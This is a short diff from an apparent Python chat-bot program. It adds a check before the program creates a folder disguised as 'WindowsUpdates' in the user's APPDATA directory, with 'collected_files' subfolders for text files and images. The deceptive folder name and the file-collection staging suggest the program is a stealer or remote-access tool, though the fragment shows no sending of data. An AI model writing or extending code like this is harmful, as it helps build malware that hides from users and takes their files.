@@ -42,6 +42,7 @@ async def on_ready():
     print(f"Bot started. Version: " + "1.0.2")
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
+    if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\txt")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\images")
